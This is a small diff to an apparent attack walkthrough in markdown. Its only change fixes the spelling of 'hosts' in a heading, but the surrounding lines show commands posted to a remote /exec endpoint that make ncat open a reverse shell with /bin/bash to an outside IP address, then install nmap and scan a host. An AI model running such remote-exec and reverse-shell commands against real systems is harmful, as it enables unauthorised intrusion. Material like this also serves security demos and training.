@@ -46,7 +46,7 @@ curl -X POST $LOAD_BALANCER_URL:$PORT/exec -d 'command=chmod +x ncat'
 sleep 1 && nohup curl -X POST $LOAD_BALANCER_URL:$PORT/exec -d 'command=./ncat 34.77.63.85 34444 -e /bin/bash' &> /dev/null & nc -lnvp 34444
 ```
 
-# Install nmap and scan hostts
+# Install nmap and scan hosts
 ```
 curl -X POST $LOAD_BALANCER_URL:$PORT/exec -d 'command=apt-get update; apt-get -y install nmap'
 curl -X POST $LOAD_BALANCER_URL:$PORT/exec -d 'command=nmap -v scanme.nmap.org'
